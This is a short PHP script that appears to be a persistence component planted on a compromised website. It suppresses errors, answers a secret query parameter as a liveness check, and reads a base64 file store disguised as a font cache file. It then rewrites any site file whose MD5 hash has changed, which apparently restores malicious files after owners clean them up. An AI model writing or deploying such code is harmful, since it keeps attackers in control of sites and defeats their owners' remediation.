<?php
@error_reporting(0);
@ini_set('display_errors', 0);
if (isset($_GET['_ck_mbnqft0'])) {
    echo '1';
    exit;
}
$myDir = dirname(__FILE__);
$rootHop = '../../..';
$siteRoot = ($rootHop === '' || $rootHop === '.') ? $myDir : $myDir . '/' . $rootHop;
$backupFile = $siteRoot . '/assets/fonts/cache/21c79f88c5ac980a501c71923a8be969.dat';
if (!@file_exists($backupFile)) {
    http_response_code(404);
    echo '0';
    exit;
}
$json = @file_get_contents($backupFile);
if (!$json) {
    echo '0';
    exit;
}
$backup = @json_decode($json, true);
if (!$backup || !isset($backup['files'])) {
    echo '0';
    exit;
}
$restored = 0;
foreach ($backup['files'] as $file => $data) {
    $path = $siteRoot . '/' . $file;
    if (!file_exists($path) || md5_file($path) !== $data['md5']) {
        $content = base64_decode($data['content']);
        if (@file_put_contents($path, $content) !== false) {
            $restored++;
        }
    }
}
echo '1';
?>